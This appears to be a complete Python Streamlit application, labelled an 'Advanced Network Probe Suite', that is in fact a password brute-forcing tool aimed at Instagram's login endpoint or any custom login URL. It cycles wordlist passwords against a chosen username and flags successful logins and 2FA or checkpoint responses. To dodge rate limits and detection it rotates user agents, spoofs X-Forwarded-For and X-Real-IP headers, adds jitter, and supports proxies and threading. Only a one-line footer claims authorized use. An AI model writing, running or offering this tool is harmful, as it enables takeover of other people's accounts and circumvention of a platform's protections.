import streamlit as st
import requests
import time
import json
import random
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
import base64
import hashlib

st.set_page_config(page_title="Advanced Network Probe Suite", layout="wide", initial_sidebar_state="expanded")

# Custom CSS for dark theme
st.markdown("""
<style>
    .main { background-color: #0e1117; }
    .stButton>button { background-color: #ff4b4b; color: white; border-radius: 8px; }
    .stTextInput>div>div>input { background-color: #1e1e1e; color: #00ff00; }
    .stTextArea>div>div>textarea { background-color: #1e1e1e; color: #00ff00; font-family: monospace; }
    .success-box { padding: 10px; border-radius: 5px; background-color: #1a472a; border-left: 4px solid #00ff00; }
    .error-box { padding: 10px; border-radius: 5px; background-color: #472a1a; border-left: 4px solid #ff4b4b; }
    .warning-box { padding: 10px; border-radius: 5px; background-color: #4a4a1a; border-left: 4px solid #ffff00; }
    .info-box { padding: 10px; border-radius: 5px; background-color: #1a1a47; border-left: 4px solid #4b4bff; }
    pre { background-color: #1e1e1e; padding: 10px; border-radius: 5px; overflow-x: auto; }
    .metric-card { background-color: #1e1e1e; padding: 15px; border-radius: 10px; text-align: center; }
</style>
""", unsafe_allow_html=True)

# Header
st.title("🔬 Advanced Network Probe Suite")
st.markdown("*Multi-endpoint testing framework with enhanced evasion capabilities*")

# Initialize session state
if 'probe_history' not in st.session_state:
    st.session_state.probe_history = []
if 'active_probes' not in st.session_state:
    st.session_state.active_probes = []

# Sidebar Configuration
with st.sidebar:
    st.header("⚙️ Configuration")

    # Target Settings
    st.subheader("Target Configuration")
    target_platform = st.selectbox(
        "Target Platform",
        ["Instagram", "Custom Endpoint"],
        index=0
    )

    if target_platform == "Instagram":
        target_user = st.text_input("Target Username", value="", placeholder="Enter username...")
        custom_endpoint = None
    else:
        custom_endpoint = st.text_input("Custom Login URL", value="", placeholder="https://...")
        target_user = st.text_input("Username Field Value", value="", placeholder="Enter username...")

    # Wordlist
    st.subheader("Payload Configuration")
    wordlist_source = st.radio("Wordlist Source", ["Manual Input", "File Upload", "Generated"])

    if wordlist_source == "Manual Input":
        wordlist_raw = st.text_area(
            "Candidate Payloads (one per line)",
            value="123456\npassword\nqwerty\n123456789",
            height=150
        )
    elif wordlist_source == "File Upload":
        uploaded_file = st.file_uploader("Upload Wordlist", type=['txt'])
        wordlist_raw = uploaded_file.read().decode('utf-8') if uploaded_file else ""
    else:
        # Generate common passwords
        common_prefixes = ["123", "pass", "admin", "user", "login"]
        common_suffixes = ["123", "456", "789", "000", "!", "@"]
        generated = []
        for prefix in common_prefixes:
            for suffix in common_suffixes:
                generated.append(f"{prefix}{suffix}")
        wordlist_raw = "\n".join(generated)
        st.text_area("Generated Payloads", value=wordlist_raw, height=100, disabled=True)

    # Advanced Settings
    st.subheader("🔧 Advanced Settings")

    with st.expander("Network Configuration"):
        use_proxy = st.checkbox("Use Proxy", value=False)
        if use_proxy:
            proxy_type = st.selectbox("Proxy Type", ["HTTP", "SOCKS4", "SOCKS5"])
            proxy_host = st.text_input("Proxy Host", value="127.0.0.1")
            proxy_port = st.number_input("Proxy Port", value=8080, min_value=1, max_value=65535)

        timeout = st.slider("Request Timeout (seconds)", 1, 30, 10)
        delay_between_requests = st.slider("Delay Between Requests (seconds)", 0.0, 5.0, 1.5, 0.1)

    with st.expander("Evasion Techniques"):
        rotate_ua = st.checkbox("Rotate User Agents", value=True)
        rotate_ips = st.checkbox("Simulate IP Rotation (Headers)", value=False)
        jitter = st.checkbox("Add Request Jitter", value=True)
        custom_headers = st.text_area("Custom Headers (JSON)", value='{"Accept-Language": "en-US,en;q=0.9"}', height=80)

    with st.expander("Threading"):
        use_threads = st.checkbox("Enable Multi-threading", value=False)
        max_workers = st.slider("Max Workers", 1, 20, 5)

    with st.expander("Response Analysis"):
        success_indicators = st.text_input("Success Keywords (comma-separated)", value="authenticated=true, success, welcome")
        failure_indicators = st.text_input("Failure Keywords (comma-separated)", value="incorrect, invalid, failed, error")
        capture_cookies = st.checkbox("Capture Response Cookies", value=True)
        save_responses = st.checkbox("Save Full Responses", value=False)

# Main Content Area
tab1, tab2, tab3 = st.tabs(["🚀 Probe Control", "📊 Live Dashboard", "📜 History"])

with tab1:
    col1, col2, col3 = st.columns([2, 1, 1])

    with col1:
        st.subheader("Probe Status")
        status_placeholder = st.empty()

    with col2:
        st.subheader("Statistics")
        stats_placeholder = st.empty()

    with col3:
        st.subheader("Controls")
        start_button = st.button("🚀 Launch Probe", type="primary", use_container_width=True)
        stop_button = st.button("🛑 Abort", type="secondary", use_container_width=True)

    # Log Display
    st.subheader("📝 Operation Log")
    log_container = st.container()

    # Progress
    progress_bar = st.progress(0)

    # Results Area
    st.subheader("🔍 Detailed Results")
    results_container = st.container()

with tab2:
    st.subheader("Real-time Metrics")

    metric_col1, metric_col2, metric_col3, metric_col4 = st.columns(4)

    with metric_col1:
        st.markdown('<div class="metric-card"><h3>Requests Sent</h3><h1 id="req-count">0</h1></div>', unsafe_allow_html=True)
    with metric_col2:
        st.markdown('<div class="metric-card"><h3>Success Rate</h3><h1 id="success-rate">0%</h1></div>', unsafe_allow_html=True)
    with metric_col3:
        st.markdown('<div class="metric-card"><h3>Avg Response Time</h3><h1 id="avg-time">0ms</h1></div>', unsafe_allow_html=True)
    with metric_col4:
        st.markdown('<div class="metric-card"><h3>Status</h3><h1 id="status-text">Idle</h1></div>', unsafe_allow_html=True)

    # Charts
    st.subheader("Response Time Distribution")
    chart_placeholder = st.empty()

    st.subheader("Status Code Breakdown")
    status_chart_placeholder = st.empty()

with tab3:
    st.subheader("Previous Probes")
    if st.session_state.probe_history:
        for idx, probe in enumerate(reversed(st.session_state.probe_history)):
            with st.expander(f"Probe {idx+1} - {probe['timestamp']} - {probe['target']}"):
                st.json(probe)
    else:
        st.info("No probe history available.")

# User Agent Pool
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/122.0.0.0",
]

def get_headers(csrf_token="", rotate=False):
    """Generate request headers with optional rotation"""
    ua = random.choice(USER_AGENTS) if rotate else USER_AGENTS[0]

    headers = {
        "User-Agent": ua,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "gzip, deflate, br",
        "DNT": "1",
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "none",
        "Sec-Fetch-User": "?1",
        "Cache-Control": "max-age=0",
    }

    if csrf_token:
        headers["X-CSRFToken"] = csrf_token
        headers["X-Requested-With"] = "XMLHttpRequest"
        headers["Referer"] = "https://www.instagram.com/accounts/login/"
        headers["Origin"] = "https://www.instagram.com"
        headers["Content-Type"] = "application/x-www-form-urlencoded"

    # Add custom headers if provided
    try:
        custom = json.loads(custom_headers) if 'custom_headers' in locals() else {}
        headers.update(custom)
    except:
        pass

    # Simulate IP rotation
    if rotate_ips:
        fake_ip = f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"
        headers["X-Forwarded-For"] = fake_ip
        headers["X-Real-IP"] = fake_ip

    return headers

def initialize_session():
    """Initialize session with cookie acquisition"""
    session = requests.Session()

    # Configure proxy if enabled
    if use_proxy:
        proxy_url = f"{proxy_type.lower()}://{proxy_host}:{proxy_port}"
        session.proxies = {
            "http": proxy_url,
            "https": proxy_url
        }

    # SSL verification
    session.verify = True

    return session

def probe_single_password(session, username, password, csrf_token, platform="Instagram"):
    """Probe a single password"""
    timestamp = int(time.time())

    if platform == "Instagram":
        payload = {
            "username": username,
            "enc_password": f"#PWD_INSTAGRAM_BROWSER:0:{timestamp}:{password}",
            "queryParams": "{}",
            "optIntoOneTap": "false",
            "stopDeletionNonce": "",
            "trustedDeviceRecords": "{}"
        }
        url = "https://www.instagram.com/accounts/login/ajax/"
    else:
        payload = {"username": username, "password": password}
        url = custom_endpoint

    headers = get_headers(csrf_token, rotate_ua)

    start_time = time.time()
    try:
        response = session.post(url, data=payload, headers=headers, timeout=timeout)
        elapsed = (time.time() - start_time) * 1000  # ms

        result = {
            "password": password,
            "status_code": response.status_code,
            "response_time_ms": round(elapsed, 2),
            "headers": dict(response.headers) if save_responses else {},
            "cookies": dict(response.cookies) if capture_cookies else {},
            "timestamp": datetime.now().isoformat(),
            "success": False,
            "message": ""
        }

        # Parse response
        if response.status_code == 200:
            try:
                data = response.json()
                result["raw_response"] = data if save_responses else ""

                # Check success indicators
                if data.get("authenticated") == True:
                    result["success"] = True
                    result["message"] = "AUTHENTICATED"
                elif data.get("status") == "ok" and data.get("authenticated") != False:
                    result["success"] = True
                    result["message"] = "POTENTIAL_SUCCESS"
                elif "checkpoint_url" in str(data) or data.get("message") == "checkpoint_required":
                    result["message"] = "CHECKPOINT_REQUIRED"
                elif "two_factor_required" in str(data):
                    result["message"] = "2FA_REQUIRED"
                else:
                    result["message"] = data.get("message", "UNKNOWN_RESPONSE")

            except ValueError:
                result["message"] = "NON_JSON_RESPONSE"
                result["raw_response"] = response.text[:500] if save_responses else ""

        elif response.status_code == 429:
            result["message"] = "RATE_LIMITED"
        elif response.status_code == 403:
            result["message"] = "FORBIDDEN"
        elif response.status_code == 401:
            result["message"] = "UNAUTHORIZED"
        else:
            result["message"] = f"HTTP_{response.status_code}"

    except requests.exceptions.ProxyError as e:
        result = {"password": password, "status_code": 0, "message": f"PROXY_ERROR: {str(e)}", "success": False}
    except requests.exceptions.Timeout:
        result = {"password": password, "status_code": 0, "message": "TIMEOUT", "success": False}
    except requests.exceptions.ConnectionError as e:
        result = {"password": password, "status_code": 0, "message": f"CONNECTION_ERROR: {str(e)}", "success": False}
    except Exception as e:
        result = {"password": password, "status_code": 0, "message": f"ERROR: {str(e)}", "success": False}

    return result

def run_probe():
    """Main probe execution"""
    if not target_user:
        st.error("❌ Please provide a target username.")
        return

    passwords = [p.strip() for p in wordlist_raw.split("\n") if p.strip()]
    if not passwords:
        st.error("❌ No valid passwords provided.")
        return

    total = len(passwords)
    st.info(f"🚀 Initializing probe against **{target_user}** with **{total}** payloads")

    session = initialize_session()

    # Initialize Instagram session
    if target_platform == "Instagram":
        with st.spinner("Acquiring session cookies..."):
            try:
                init_res = session.get(
                    "https://www.instagram.com/accounts/login/",
                    headers=get_headers(rotate=rotate_ua),
                    timeout=timeout
                )
                csrf_token = session.cookies.get("csrftoken", "")
                if csrf_token:
                    st.success(f"✅ Session initialized. CSRF Token acquired.")
                else:
                    st.warning("⚠️ No CSRF token found. Proceeding anyway...")
            except Exception as e:
                st.error(f"❌ Session initialization failed: {str(e)}")
                return
    else:
        csrf_token = ""

    # Results tracking
    results = []
    success_count = 0
    rate_limit_hits = 0
    response_times = []
    status_codes = {}

    # Progress tracking
    progress_text = st.empty()

    # Run probe
    if use_threads and not target_platform == "Instagram":  # Instagram doesn't like threads
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            future_to_pwd = {
                executor.submit(probe_single_password, session, target_user, pwd, csrf_token, target_platform): pwd 
                for pwd in passwords
            }

            for idx, future in enumerate(as_completed(future_to_pwd)):
                result = future.result()
                results.append(result)

                if result["success"]:
                    success_count += 1
                if result["message"] == "RATE_LIMITED":
                    rate_limit_hits += 1
                if result.get("response_time_ms"):
                    response_times.append(result["response_time_ms"])

                status_codes[result["status_code"]] = status_codes.get(result["status_code"], 0) + 1

                progress = (idx + 1) / total
                progress_bar.progress(progress)
                progress_text.text(f"Progress: {idx+1}/{total} | Successes: {success_count} | Rate Limits: {rate_limit_hits}")

                # Add jitter
                if jitter:
                    time.sleep(random.uniform(0, delay_between_requests))
                else:
                    time.sleep(delay_between_requests)
    else:
        for idx, pwd in enumerate(passwords):
            result = probe_single_password(session, target_user, pwd, csrf_token, target_platform)
            results.append(result)

            if result["success"]:
                success_count += 1
                st.balloons()
                st.success(f"🎉 POTENTIAL MATCH FOUND: `{pwd}` - {result['message']}")
            if result["message"] == "RATE_LIMITED":
                rate_limit_hits += 1
            if result.get("response_time_ms"):
                response_times.append(result["response_time_ms"])

            status_codes[result["status_code"]] = status_codes.get(result["status_code"], 0) + 1

            progress = (idx + 1) / total
            progress_bar.progress(progress)
            progress_text.text(f"Progress: {idx+1}/{total} | Successes: {success_count} | Rate Limits: {rate_limit_hits}")

            # Display result in log
            with log_container:
                if result["success"]:
                    st.markdown(f'<div class="success-box">✅ [{datetime.now().strftime("%H:%M:%S")}] **{pwd}** → {result["message"]} ({result.get("response_time_ms", 0)}ms)</div>', unsafe_allow_html=True)
                elif result["message"] == "RATE_LIMITED":
                    st.markdown(f'<div class="warning-box">⚠️ [{datetime.now().strftime("%H:%M:%S")}] **{pwd}** → RATE LIMITED</div>', unsafe_allow_html=True)
                elif "ERROR" in result["message"]:
                    st.markdown(f'<div class="error-box">❌ [{datetime.now().strftime("%H:%M:%S")}] **{pwd}** → {result["message"]}</div>', unsafe_allow_html=True)
                else:
                    st.markdown(f'<div class="info-box">ℹ️ [{datetime.now().strftime("%H:%M:%S")}] **{pwd}** → {result["message"]} ({result.get("response_time_ms", 0)}ms)</div>', unsafe_allow_html=True)

            # Add jitter
            if jitter:
                time.sleep(random.uniform(delay_between_requests * 0.5, delay_between_requests * 1.5))
            else:
                time.sleep(delay_between_requests)

    # Final Summary
    st.divider()
    st.subheader("📊 Final Report")

    col1, col2, col3, col4 = st.columns(4)
    col1.metric("Total Requests", total)
    col2.metric("Successes", success_count, f"{success_count/total*100:.1f}%")
    col3.metric("Rate Limits", rate_limit_hits)
    col4.metric("Avg Response Time", f"{sum(response_times)/len(response_times):.0f}ms" if response_times else "N/A")

    # Status code breakdown
    st.subheader("Status Code Distribution")
    status_df = {str(k): v for k, v in status_codes.items()}
    st.bar_chart(status_df)

    # Detailed results table
    st.subheader("Detailed Results")
    results_df = []
    for r in results:
        results_df.append({
            "Password": r["password"],
            "Status": r["status_code"],
            "Result": r["message"],
            "Response Time (ms)": r.get("response_time_ms", "N/A"),
            "Timestamp": r.get("timestamp", "")
        })

    st.dataframe(results_df, use_container_width=True)

    # Save to history
    st.session_state.probe_history.append({
        "timestamp": datetime.now().isoformat(),
        "target": target_user,
        "platform": target_platform,
        "total_attempts": total,
        "successes": success_count,
        "results": results
    })

    if success_count == 0:
        st.info("🔍 Probe completed. No successful authentications detected.")

# Execute probe when button is clicked
if start_button:
    run_probe()

if stop_button:
    st.warning("🛑 Abort signal sent. Current operation will terminate after current request.")
    st.stop()

# Footer
st.divider()
st.caption("🔬 Advanced Network Probe Suite | For authorized security testing only | v2.0")
